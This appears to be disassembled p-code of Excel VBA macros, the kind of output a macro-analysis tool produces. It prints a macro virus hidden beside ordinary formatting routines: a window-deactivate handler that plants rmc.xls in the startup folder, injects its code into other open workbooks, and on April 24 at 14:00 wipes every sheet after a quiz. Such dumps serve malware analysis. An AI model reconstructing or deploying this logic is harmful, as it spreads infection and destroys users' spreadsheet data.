' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	St dhour 
' Line #87:
' Line #88:
' 	Ld dmonth 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld dday 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	Ld dhour 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #89:
' Line #90:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LineCont 0x0004 08 00 02 00
' 	LitStr 0x0046 "Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? "
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0012 "Answer : Barisada "
' 	Concat 
' 	Ld vbYesNo 
' 	LitStr 0x000C "1st Qusetion"
' 	ArgsLd MsgBox 0x0003 
' 	St v1 
' Line #92:
' Line #93:
' 	Ld v1 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "Good! You're Authorized now!!"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #94:
' 	Ld v1 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitStr 0x002C "I wil give you one more Chance. Be careful!!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000C "Wrong Answer"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	LitStr 0x002E "Summoning Xavier is the Ultimate Magic. Right?"
' 	Ld vbYesNo 
' 	LitStr 0x002B "Wrong Answer may cause The Serious Problem!"
' 	ArgsLd MsgBox 0x0003 
' 	St v2 
' Line #97:
' 	Ld v2 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "ok , i will forgive you"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #98:
' 	Ld v2 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0028 "Wrong Answer, Your file will be deleted!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000D "You shall Die"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Sheets 
' 	MemLd Count 
' 	For 
' Line #102:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemLd Cells 
' 	ArgsMemCall Set 0x0000 
' Line #103:
' 	Ld Selection 
' 	ArgsMemCall Clear 0x0000 
' Line #104:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndIfBlock 
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' _VBA_PROJECT_CUR/VBA/List1 - 9832 bytes
' Line #0:
' 	FuncDefn (Public Sub Format$())
' Line #1:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn p (As Integer)
' 	VarDefn c (As Integer)
' 	VarDefn col (As String)
' 	VarDefn range (As String)
' Line #2:
' 	Dim 
' 	VarDefn tmp (As String)
' 	VarDefn mask (As String)
' 	VarDefn cellval (As String)
' Line #3:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #4:
' 	Ld c 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St tmp 
' Line #8:
' 	LitDI2 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St mask 
' Line #9:
' 	Ld mask 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld tmp 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	Ld mask 
' 	LitStr 0x000A "hide_field"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	MemLd EntireColumn 
' 	ArgsMemCall Delete 0x0000 
' Line #12:
' 	Ld mask 
' 	LitStr 0x000B "number_mask"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	ElseIfBlock 
' Line #13:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St col 
' Line #14:
' 	LitStr 0x0018 "#,##0.00;[Red]-#,##0.00 "
' 	Ld col 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #17:
' 	LitDI2 0x0001 
' 	St p 
' Line #18:
' 	LitStr 0x0000 ""
' 	St tmp 
' Line #19:
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St cellval 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mask 
' 	FnLen 
' 	For 
' Line #21:
' 	Ld p 
' 	Ld cellval 
' 	FnLen 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #22:
' 	LitStr 0x0003 "@#!"
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	Ld tmp 
' 	Ld cellval 
' 	Ld p 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #24:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Add 
' 	St p 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	Ld tmp 
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld tmp 
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #30:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitStr 0x0002 "A2"
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireRow 
' 	ArgsMemCall Delete 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Public Sub ConvertDate())
' Line #38:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn str (As String)
' 	VarDefn julDate (As Long)
' 	VarDefn c (As String)
' 	VarDefn range (As String)
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #40:
' 	Ld i 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St str 
' Line #45:
' 	Ld str 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #47:
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St julDate 
' Line #48:
' 	Ld julDate 
' 	LitDI4 0x1B7D 0x000B 
' 	Ge 
' 	Ld julDate 
' 	LitDI4 0x2B2B 0x000B 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld julDate 
' 	LitDI4 0x955A 0x000A 
' 	Sub 
' 	Coerce (Date) 
' 	St d 
' Line #50:
' 	Ld d 
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St c 
' Line #54:
' 	LitDI2 0x0002 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitVarSpecial (False)
' 	St flag 
' Line #63:
' Line #64:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St myfile 
' Line #65:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	IfBlock 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed addtomru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #72:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St eline 
' Line #73:
' 	Ld eline 
' 	Ld o 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld eline 
' 	LitStr 0x000C "thisworkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vcode 
' 	EndIf 
' Line #74:
' Line #75:
' Line #76:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #77:
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St vcount 
' Line #78:
' 	Ld vcount 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld vcode 
' 	Paren 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #79:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' Line #81:
' Line #82:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0007 "rmc.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' 	EndIf 
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St dmonth 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St dday 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	St dhour 
' Line #87:
' Line #88:
' 	Ld dmonth 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld dday 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	Ld dhour 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St flag 
' 	EndIf 
' Line #89:
' Line #90:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LineCont 0x0004 08 00 02 00
' 	LitStr 0x0046 "Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? "
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0012 "Answer : Barisada "
' 	Concat 
' 	Ld vbYesNo 
' 	LitStr 0x000C "1st Qusetion"
' 	ArgsLd MsgBox 0x0003 
' 	St v1 
' Line #92:
' Line #93:
' 	Ld v1 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "Good! You're Authorized now!!"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #94:
' 	Ld v1 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitStr 0x002C "I wil give you one more Chance. Be careful!!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000C "Wrong Answer"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	LitStr 0x002E "Summoning Xavier is the Ultimate Magic. Right?"
' 	Ld vbYesNo 
' 	LitStr 0x002B "Wrong Answer may cause The Serious Problem!"
' 	ArgsLd MsgBox 0x0003 
' 	St v2 
' Line #97:
' 	Ld v2 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "ok , i will forgive you"
' 	Ld vbOKOnly 
' 	LitStr 0x000C "Right Answer"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #98:
' 	Ld v2 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0028 "Wrong Answer, Your file will be deleted!"
' 	Ld vbOKOnly 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000D "You shall Die"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Sheets 
' 	MemLd Count 
' 	For 
' Line #102:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemLd Cells 
' 	ArgsMemCall Set 0x0000 
' Line #103:
' 	Ld Selection 
' 	ArgsMemCall Clear 0x0000 
' Line #104:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndIfBlock 
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' _VBA_PROJECT_CUR/VBA/List2 - 9832 bytes
' Line #0:
' 	FuncDefn (Public Sub Format$())
' Line #1:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn p (As Integer)
' 	VarDefn c (As Integer)
' 	VarDefn col (As String)
' 	VarDefn range (As String)
' Line #2:
' 	Dim 
' 	VarDefn tmp (As String)
' 	VarDefn mask (As String)
' 	VarDefn cellval (As String)
' Line #3:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #4:
' 	Ld c 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St tmp 
' Line #8:
' 	LitDI2 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St mask 
' Line #9:
' 	Ld mask 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld tmp 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	Ld mask 
' 	LitStr 0x000A "hide_field"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	MemLd EntireColumn 
' 	ArgsMemCall Delete 0x0000 
' Line #12:
' 	Ld mask 
' 	LitStr 0x000B "number_mask"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	ElseIfBlock 
' Line #13:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St col 
' Line #14:
' 	LitStr 0x0018 "#,##0.00;[Red]-#,##0.00 "
' 	Ld col 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #17:
' 	LitDI2 0x0001 
' 	St p 
' Line #18:
' 	LitStr 0x0000 ""
' 	St tmp 
' Line #19:
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St cellval 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mask 
' 	FnLen 
' 	For 
' Line #21:
' 	Ld p 
' 	Ld cellval 
' 	FnLen 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #22:
' 	LitStr 0x0003 "@#!"
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	Ld tmp 
' 	Ld cellval 
' 	Ld p 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #24:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Add 
' 	St p 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	Ld tmp 
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld tmp 
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #30:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitStr 0x0002 "A2"
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireRow 
' 	ArgsMemCall Delete 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Public Sub ConvertDate())
' Line #38:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn str (As String)
' 	VarDefn julDate (As Long)
' 	VarDefn c (As String)
' 	VarDefn range (As String)
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #40:
' 	Ld i 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitDI2 0x0001 
